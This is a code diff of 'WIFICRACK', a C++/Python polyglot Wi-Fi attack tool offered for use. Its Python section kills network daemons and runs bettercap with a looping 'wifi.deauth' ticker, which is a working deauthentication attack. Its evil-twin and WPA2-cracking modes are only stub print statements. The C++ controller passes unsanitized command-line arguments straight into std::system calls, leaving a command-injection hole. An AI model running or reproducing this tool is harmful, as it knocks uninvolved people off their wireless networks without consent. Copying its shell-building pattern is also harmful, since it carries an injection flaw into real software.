@@ -1,67 +1,60 @@
-# """
-# ============================================================================
-#                      WIFICRACK CUSTOM HYBRID FRAMEWORK
-# ============================================================================
-# This is a hybrid C++/Python 3 script layout. 
-# C++ handles native hardware validations, user privilege boundaries, 
-# and hands execution over to Python 3 for asynchronous background processing.
-# ============================================================================
-# """
 #if 0
-'''
-#=============================================================================
-# 🐍 PYTHON EXECUTOR MODULE
-#=============================================================================
-'''
+# ============================================================================
+# 🐍 SECTION A: PYTHON EXECUTION MODULE (Skipped by C++ compiler)
+# ============================================================================
 import sys
 import os
 import time
 import subprocess
 
-def print_banner():
+def display_engine_banner():
     print("====================================================")
-    print("          WIFICRACK: Hybrid Execution Engine        ")
+    print("          WIFICRACK: Hybrid Processing Engine       ")
     print("====================================================")
 
-def run_wireless_orchestration(interface, mode):
-    print(f"[*] Python engine received wireless directive for: {interface}")
+def execute_wireless_routine(interface, mode):
+    print(f"[*] Python background worker attached to interface: {interface}")
     if mode == "deauth":
-        print("[*] Flushing system network hooks via subprocess...")
+        print("[*] Flushing conflicting network daemons...")
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         print("[+] Launching background monitor tracking loop...")
         cmd = f"sudo bettercap -iface {interface} -eval \"wifi.recon on; set ticker.period 4; set ticker.commands 'wifi.deauth'; ticker on\" > /dev/null 2>&1 &"
         os.system(cmd)
         
-        print("[+] Loop active on interface layer. Monitor mode active.")
+        print("[+] Monitor mode established. Press Ctrl+C to terminate.")
         try:
             while True:
                 time.sleep(1)
         except KeyboardInterrupt:
-            print("\n[-] Terminating background worker tracking routines.")
+            print("\n[-] Terminating monitoring routines.")
+            
     elif mode == "twin":
-        print("[*] Initializing automated environment profiles for simulated portal verification...")
-        print("[+] Mapping localized captive gateway interface tables...")
-        print("[+] Simulated access point framework fully online.")
+        print("[*] Initializing automated environment profiles...")
+        print("[+] Simulated access point framework online.")
 
-def run_cryptographic_parsing(file_path):
-    print(f"[*] Opening offline capture data file target: {file_path}")
-    print("[*] Initializing dictionary parsing loop against standard WPA2 blocks...")
+def execute_cryptographic_parsing(file_path):
+    print(f"[*] Loading offline capture target: {file_path}")
+    print("[*] Initializing dictionary parsing loop against standard handshake records...")
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
         sys.exit(1)
-    action_type = sys.argv[1]
-    print_banner()
-    if action_type == "wifi":
-        run_wireless_orchestration(sys.argv[2], sys.argv[3])
-    elif action_type == "crypto":
-        run_cryptographic_parsing(sys.argv[2])
+        
+    execution_route = sys.argv[1]
+    display_engine_banner()
+    
+    if execution_route == "wifi":
+        execute_wireless_routine(sys.argv[2], sys.argv[3])
+    elif execution_route == "crypto":
+        execute_cryptographic_parsing(sys.argv[2])
+        
+    # Crucial: Forces Python to exit here so it never attempts to read the C++ code below
     sys.exit(0)
 #endif
 
 // ============================================================================
-// 🏛️ C++ MASTER CONTROLLER MODULE
+// 🏛️ SECTION B: C++ HIGH-PERFORMANCE CORE (Skipped by Python engine)
 // ============================================================================
 #include <iostream>
 #include <string>
@@ -72,23 +65,27 @@ if __name__ == "__main__":
 #include <sys/ioctl.h>
 #include <net/if.h>
 
-void printUsage(const std::string& programName) {
+void displayUsageGuide(const std::string& programName) {
     std::cout << "====================================================\n"
-              << "          WIFICRACK: C++ + Python3 Engine          \n"
+              << "          WIFICRACK: Unified Network Engine         \n"
               << "====================================================\n"
               << "Usage: " << programName << " [options]\n\n"
-              << "Options:\n"
-              << "  -i <interface>   Target network adapter interface (e.g., wlan0)\n"
-              << "  -m <action>      Action profile (e.g., deauth, twin)\n"
-              << "  -f <file_path>   Path to captured handshake (.pcap)\n"
-              << "  -h               Show this guidance screen\n";
+              << "Network Modes:\n"
+              << "  -i <interface>   Target interface adapter (e.g., wlan0, eth0)\n"
+              << "  -m <action>      Action profile (e.g., deauth, twin)\n\n"
+              << "Offline Parsing Modes:\n"
+              << "  -f <file_path>   Path to captured network handshake (.pcap)\n\n"
+              << "General Options:\n"
+              << "  -h               Show this comprehensive guidance screen\n";
 }
 
-bool verifyInterfaceStatus(const std::string& ifaceName) {
+bool verifyHardwareInterface(const std::string& ifaceName) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return false;
+
     struct ifreq ifr;
     std::strncpy(ifr.ifr_name, ifaceName.c_str(), IFNAMSIZ - 1);
+
     if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
         unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
         printf("[+] Natively Verified Hardware MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
@@ -112,7 +109,9 @@ int main(int argc, char* argv[]) {
             case 'm': mode = optarg; break;
             case 'f': filePath = optarg; break;
             case 'h':
-            default: printUsage(argv[0]); return 0;
+            default:
+                displayUsageGuide(argv[0]);
+                return 0;
         }
     }
 
@@ -123,23 +122,25 @@ int main(int argc, char* argv[]) {
 
     if (!interface.empty() && !mode.empty()) {
         std::cout << "[*] Executing Core Compiled System Validations...\n";
-        if (!verifyInterfaceStatus(interface)) {
-            std::cerr << "[-] Error: Interface '" << interface << "' is unreachable.\n";
+        if (!verifyHardwareInterface(interface)) {
+            std::cerr << "[-] Error: Specified hardware interface '" << interface << "' is unreachable.\n";
             return 1;
         }
-        std::cout << "[+] Hardware verified. Invoking Python engine layer natively...\n\n";
+
+        std::cout << "[+] Hardware mapping confirmed. Launching Python execution pipeline...\n\n";
         std::string command = "python3 ./wificrack.cpy wifi " + interface + " " + mode;
         std::system(command.c_str());
-    } 
+    }
     else if (!filePath.empty()) {
-        std::cout << "[*] File target mapped. Triggering analytical data parsers...\n\n";
+        std::cout << "[*] File target mapped. Initializing Python data parsing components...\n\n";
         std::string command = "python3 ./wificrack.cpy crypto " + filePath;
         std::system(command.c_str());
-    } 
+    }
     else {
-        printUsage(argv[0]);
+        displayUsageGuide(argv[0]);
         return 1;
     }
+
     return 0;
 }
       
